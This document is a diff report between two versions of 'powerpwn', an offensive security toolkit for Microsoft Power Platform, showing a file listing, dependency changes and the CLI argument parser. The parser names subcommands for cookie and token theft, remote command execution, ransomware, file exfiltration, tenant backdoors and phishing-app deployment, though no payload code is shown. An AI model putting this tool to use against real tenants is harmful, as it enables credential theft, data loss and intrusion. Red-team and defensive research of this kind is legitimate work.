+-rw-r--r--   0 mbg        (501) staff       (20)      500 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/steal_power_automate_token_command_args.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.242746 powerpwn-2.1.5/src/powerpwn/powerdoor/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3673 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/backdoor_flow.py
+-rw-r--r--   0 mbg        (501) staff       (20)      299 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/create_flow_model.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.245484 powerpwn-2.1.5/src/powerpwn/powerdoor/enums/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/enums/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      225 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/enums/action_type.py
+-rw-r--r--   0 mbg        (501) staff       (20)      120 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/enums/flow_state.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1807 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/flow_factory_installer.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.247475 powerpwn-2.1.5/src/powerpwn/powerdoor/samples/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/samples/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)    22664 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/samples/flow_factory_to_install.json
+-rw-r--r--   0 mbg        (501) staff       (20)     2524 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.248396 powerpwn-2.1.5/src/powerpwn/powerdump/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/__init__.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.248865 powerpwn-2.1.5/src/powerpwn/powerdump/collect/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/__init__.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.250944 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/__init__.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.251801 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3422 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.256369 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/
+-rw-r--r--   0 mbg        (501) staff       (20)     1555 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     2436 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py
+-rw-r--r--   0 mbg        (501) staff       (20)     6014 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1722 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py
+-rw-r--r--   0 mbg        (501) staff       (20)     6982 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py
+-rw-r--r--   0 mbg        (501) staff       (20)     4053 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py
+-rw-r--r--   0 mbg        (501) staff       (20)     5748 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3694 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3815 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3845 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py
+-rw-r--r--   0 mbg        (501) staff       (20)     4289 2024-04-18 20:07:43.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1356 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/data_collector.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.257744 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/enums/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/enums/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      125 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_source.py
+-rw-r--r--   0 mbg        (501) staff       (20)      266 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_type.py
+-rw-r--r--   0 mbg        (501) staff       (20)      202 2024-04-18 20:16:37.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/idata_collector.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.263786 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      734 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/base_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)      509 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/base_validator.py
+-rw-r--r--   0 mbg        (501) staff       (20)      460 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/canvas_app_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1259 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/connection_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1992 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/connector_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)      656 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_dump_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)      762 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_record_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1001 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_store_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)      482 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_store_validator.py
+-rw-r--r--   0 mbg        (501) staff       (20)      494 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/principal_entity.py
+-rw-r--r--   0 mbg        (501) staff       (20)      359 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/resource_entity_base.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.268692 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3342 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/_api.py
+-rw-r--r--   0 mbg        (501) staff       (20)     4857 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py
+-rw-r--r--   0 mbg        (501) staff       (20)     4604 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py
+-rw-r--r--   0 mbg        (501) staff       (20)     2871 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.269302 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/enums/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/enums/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      192 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/enums/resource_type.py
+-rw-r--r--   0 mbg        (501) staff       (20)      682 2024-04-18 20:16:43.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py
+-rw-r--r--   0 mbg        (501) staff       (20)     2605 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.272690 powerpwn-2.1.5/src/powerpwn/powerdump/gui/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     2118 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/gui.py
+-rw-r--r--   0 mbg        (501) staff       (20)     5472 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/prep.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.277806 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/
+-rw-r--r--   0 mbg        (501) staff       (20)       70 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1391 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/base.html
+-rw-r--r--   0 mbg        (501) staff       (20)     1138 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/canvasapps_table.html
+-rw-r--r--   0 mbg        (501) staff       (20)     1745 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/connections_table.html
+-rw-r--r--   0 mbg        (501) staff       (20)     1104 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/connectors_table.html
+-rw-r--r--   0 mbg        (501) staff       (20)      290 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/json_object.html
+-rw-r--r--   0 mbg        (501) staff       (20)     1275 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/logic_flows_table.html
+-rw-r--r--   0 mbg        (501) staff       (20)     1158 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/resources_table.html
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.282284 powerpwn-2.1.5/src/powerpwn/powerdump/utils/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     5842 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/auth.py
+-rw-r--r--   0 mbg        (501) staff       (20)      366 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/const.py
+-rw-r--r--   0 mbg        (501) staff       (20)     4479 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/json_utils.py
+-rw-r--r--   0 mbg        (501) staff       (20)     6032 2024-04-18 20:07:43.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/model_loaders.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1077 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/path_utils.py
+-rw-r--r--   0 mbg        (501) staff       (20)     3036 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/requests_wrapper.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1168 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerdump/utils/token_cache.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.283529 powerpwn-2.1.5/src/powerpwn/powerphishing/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerphishing/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     8571 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/powerphishing/app_installer.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.284505 powerpwn-2.1.5/src/powerpwn.egg-info/
+-rw-r--r--   0 mbg        (501) staff       (20)      741 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/PKG-INFO
+-rw-r--r--   0 mbg        (501) staff       (20)     6197 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/SOURCES.txt
+-rw-r--r--   0 mbg        (501) staff       (20)        1 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/dependency_links.txt
+-rw-r--r--   0 mbg        (501) staff       (20)       48 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/entry_points.txt
+-rw-r--r--   0 mbg        (501) staff       (20)      348 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/requires.txt
+-rw-r--r--   0 mbg        (501) staff       (20)        9 2024-04-18 20:24:32.000000 powerpwn-2.1.5/src/powerpwn.egg-info/top_level.txt
```

### Comparing `powerpwn-2.1.4/PKG-INFO` & `powerpwn-2.1.5/PKG-INFO`

 * *Files 19% similar despite different names*

```diff
@@ -1,22 +1,23 @@
 Metadata-Version: 2.1
 Name: powerpwn
-Version: 2.1.4
-Author: Michael Bargury
+Version: 2.1.5
+Author: Michael Bargury, Lana Salameh and Avishai Efrat
 Requires-Dist: pydantic[email]==1.10.7
 Requires-Dist: pydantic==1.10.7
 Requires-Dist: swagger-ui-py==22.7.13
 Requires-Dist: Flask==2.2.5
 Requires-Dist: requests>=2.31.0
 Requires-Dist: msal>=1.20.0
 Requires-Dist: responses>=0.23.1
-Requires-Dist: pytest>=7.2.2
-Requires-Dist: prance>=0.22.11.4.0
+Requires-Dist: pytest>=8.1.1
+Requires-Dist: prance>=23.6.21.0
 Requires-Dist: openapi>=1.1.0
 Requires-Dist: openapi-spec-validator>=0.5.6
 Requires-Dist: jsf>=0.7.1
-Requires-Dist: pillow>=10.0.0
+Requires-Dist: pillow>=10.3.0
 Requires-Dist: scandir>=1.10.0
 Requires-Dist: backports.shutil-get-terminal-size>=1.0.0
 Requires-Dist: browsepy>=0.5.6
-Requires-Dist: art
+Requires-Dist: art>=6.1
 Requires-Dist: typing_extensions<4.6.0
+Requires-Dist: pyjwt>=2.6.0
```

### Comparing `powerpwn-2.1.4/setup.cfg` & `powerpwn-2.1.5/setup.cfg`

 * *Files 17% similar despite different names*

```diff
@@ -1,32 +1,33 @@
 [metadata]
 name = powerpwn
-author = Michael Bargury
-version = 2.1.4
+author = Michael Bargury, Lana Salameh and Avishai Efrat
+version = 2.1.5
 
 [options]
 install_requires = 
 	pydantic[email] ==1.10.7
 	pydantic ==1.10.7
 	swagger-ui-py ==22.7.13
 	Flask ==2.2.5
 	requests >=2.31.0
 	msal >=1.20.0
 	responses >=0.23.1
-	pytest >=7.2.2
-	prance >=0.22.11.4.0
+	pytest >=8.1.1
+	prance >=23.6.21.0
 	openapi >=1.1.0
 	openapi-spec-validator >=0.5.6
 	jsf >=0.7.1
-	pillow >=10.0.0
+	pillow >=10.3.0
 	scandir >=1.10.0
 	backports.shutil-get-terminal-size >=1.0.0
 	browsepy >=0.5.6
-	art
+	art >= 6.1
 	typing_extensions<4.6.0
+	pyjwt >=2.6.0
 package_dir = 
 	= src
 packages = find:
 
 [options.packages.find]
 where = src
```

### Comparing `powerpwn-2.1.4/src/powerpwn/cli/arguments.py` & `powerpwn-2.1.5/src/powerpwn/cli/arguments.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,143 +1,145 @@
-import argparse
-import logging
-
-from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
-from powerpwn.powerdoor.enums.action_type import BackdoorActionType
-from powerpwn.powerdump.utils.const import CACHE_PATH
-
-
-def module_gui(sub_parser: argparse.ArgumentParser):
-    gui_parser = sub_parser.add_parser("gui", description="Show collected resources and data.", help="Show collected resources and data via GUI.")
-    gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")
-
-
-def module_dump(sub_parser: argparse.ArgumentParser):
-    dump_parser = sub_parser.add_parser(
-        "dump", description="Dump content for all available connection from recon", help="Dump content for all available connection from recon"
-    )
-    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
-    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
-    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
-    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
-
-
-def module_recon(sub_parser: argparse.ArgumentParser):
-    dump_parser = sub_parser.add_parser("recon", description="Recon for available data connections", help="Recon for available data connections.")
-    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
-    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
-    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
-    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
-
-
-def module_nocodemalware(command_subparsers: argparse.ArgumentParser):
-    nocodemalware_parser = command_subparsers.add_parser(
-        "nocodemalware",
-        description="Repurpose trusted execs, service accounts and cloud services to power a malware operation",
-        help="Repurpose trusted execs, service accounts and cloud services to power a malware operation.",
-    )
-    nocodemalware_parser.add_argument(
-        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
-    )
-    nocodemalware_parser = nocodemalware_parser.add_subparsers(help="nocodemalware_subcommand", dest="nocodemalware_subcommand")
-
-    module_nocodemalware_subcommand_exec(nocodemalware_parser)
-
-
-def module_nocodemalware_subcommand_exec(command_subparsers: argparse.ArgumentParser):
-    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")
-    steal_fqdn_parser.add_argument("--fqdn", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")
-
-    command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")
-
-    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")
-    execute_command_parser.add_argument(
-        "-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type"
-    )
-    execute_command_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")
-
-    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")
-    ransomware_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
-    ransomware_parser.add_argument(
-        "-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)"
-    )
-    ransomware_parser.add_argument(
-        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a comma (e.g.'C:\\,D:\\')"
-    )
-
-    exfiltrate_file_parser = command_subparsers.add_parser("exfiltrate", description="Exfiltrate file")
-    exfiltrate_file_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")
-
-    command_subparsers.add_parser("cleanup", description="Cleanup")
-
-
-def module_backdoor(command_subparsers: argparse.ArgumentParser):
-    backdoor_parser = command_subparsers.add_parser(
-        "backdoor", description="Install a backdoor on the target tenant.", help="Install a backdoor on the target tenant"
-    )
-    backdoor_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")
-    backdoor_subparsers = backdoor_parser.add_subparsers(help="backdoor_subcommand", dest="backdoor_subcommand")
-
-    ## Delete Flow parser ##
-    delete_flow_parser = backdoor_subparsers.add_parser(
-        BackdoorActionType.delete_flow.value, description="Deletes flow.", help="Deletes flow using installed backdoor flow."
-    )
-    delete_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
-    delete_flow_parser.add_argument("-f", "--flow-id", type=str, help="Flow id to delete.")
-
-    ## Create Flow parser ##
-    create_flow_parser = backdoor_subparsers.add_parser(
-        BackdoorActionType.create_flow.value, description="Creates a flow.", help="Creates a flow using installed backdoor flow."
-    )
-    create_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
-    create_flow_parser.add_argument("-i", "--input", type=str, required=True, help="Path to flow details input file.")
-
-    ## Get connections parser ##
-    get_connections_parser = backdoor_subparsers.add_parser(
-        BackdoorActionType.get_connections.value, description="Get connections", help="Gets connections details in environment"
-    )
-    get_connections_parser.add_argument(
-        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
-    )
-    get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")
-
-    ## backdoor installer parser ##
-    installer = backdoor_subparsers.add_parser(
-        BackdoorActionType.install_factory.value, description="Install flow factory", help="Installs flow factory in powerplatform"
-    )
-    installer.add_argument("-c", "--connection-id", required=True, type=str, help="The connection id of management connection")
-    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
-
-
-def module_phishing(command_subparsers: argparse.ArgumentParser):
-    phishing = command_subparsers.add_parser("phishing", description="Deploy a trustworthy phishing app", help="Deploy a trustworthy phishing app.")
-    phishing_subparsers = phishing.add_subparsers(help="phishing_subcommand", dest="phishing_subcommand")
-
-    installer = phishing_subparsers.add_parser(
-        "install-app", description="Installs phishing app.", help="Installs a phishing app in the target environment."
-    )
-    installer.add_argument("-i", "--input", type=str, required=True, help="Path to app package zip file.")
-    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
-    installer.add_argument("-n", "--app-name", required=True, type=str, help="Display name of the app.")
-    installer.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id to install the app in.")
-
-    app_share = phishing_subparsers.add_parser("share-app", description="Share app with organization", help="Share app with organization")
-    app_share.add_argument("-a", "--app-id", required=True, type=str, help="App id to share")
-    app_share.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id that the app belongs to.")
-    app_share.add_argument("-t", "--tenant", required=True, type=str, help="Tenant id to connect.")
-
-
-def parse_arguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
-    command_subparsers = parser.add_subparsers(help="command", dest="command")
-
-    module_dump(command_subparsers)
-    module_recon(command_subparsers)
-    module_gui(command_subparsers)
-    module_backdoor(command_subparsers)
-    module_nocodemalware(command_subparsers)
-    module_phishing(command_subparsers)
-
-    args = parser.parse_args()
-
-    return args
+import argparse
+import logging
+
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.powerdoor.enums.action_type import BackdoorActionType
+from powerpwn.powerdump.utils.const import CACHE_PATH
+
+
+def module_gui(sub_parser: argparse.ArgumentParser):
+    gui_parser = sub_parser.add_parser("gui", description="Show collected resources and data.", help="Show collected resources and data via GUI.")
+    gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")
+    gui_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to launch gui.")
+
+
+def module_dump(sub_parser: argparse.ArgumentParser):
+    dump_parser = sub_parser.add_parser(
+        "dump", description="Dump content for all available connection from recon", help="Dump content for all available connection from recon"
+    )
+    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
+    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
+    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
+    dump_parser.add_argument("-r", "--recon", action="store_true", help="Run recon before dump. Should be used if recon command was not run before.")
+
+
+def module_recon(sub_parser: argparse.ArgumentParser):
+    dump_parser = sub_parser.add_parser("recon", description="Recon for available data connections", help="Recon for available data connections.")
+    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
+    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
+    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
+
+
+def module_nocodemalware(command_subparsers: argparse.ArgumentParser):
+    nocodemalware_parser = command_subparsers.add_parser(
+        "nocodemalware",
+        description="Repurpose trusted execs, service accounts and cloud services to power a malware operation",
+        help="Repurpose trusted execs, service accounts and cloud services to power a malware operation.",
+    )
+    nocodemalware_parser.add_argument(
+        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
+    )
+    nocodemalware_parser = nocodemalware_parser.add_subparsers(help="nocodemalware_subcommand", dest="nocodemalware_subcommand")
+
+    module_nocodemalware_subcommand_exec(nocodemalware_parser)
+
+
+def module_nocodemalware_subcommand_exec(command_subparsers: argparse.ArgumentParser):
+    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")
+    steal_fqdn_parser.add_argument("--fqdn", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")
+
+    command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")
+
+    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")
+    execute_command_parser.add_argument(
+        "-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type"
+    )
+    execute_command_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")
+
+    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")
+    ransomware_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
+    ransomware_parser.add_argument(
+        "-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)"
+    )
+    ransomware_parser.add_argument(
+        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a comma (e.g.'C:\\,D:\\')"
+    )
+
+    exfiltrate_file_parser = command_subparsers.add_parser("exfiltrate", description="Exfiltrate file")
+    exfiltrate_file_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")
+
+    command_subparsers.add_parser("cleanup", description="Cleanup")
+
+
+def module_backdoor(command_subparsers: argparse.ArgumentParser):
+    backdoor_parser = command_subparsers.add_parser(
+        "backdoor", description="Install a backdoor on the target tenant.", help="Install a backdoor on the target tenant"
+    )
+    backdoor_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")
+    backdoor_subparsers = backdoor_parser.add_subparsers(help="backdoor_subcommand", dest="backdoor_subcommand")
+
+    ## Delete Flow parser ##
+    delete_flow_parser = backdoor_subparsers.add_parser(
+        BackdoorActionType.delete_flow.value, description="Deletes flow.", help="Deletes flow using installed backdoor flow."
+    )
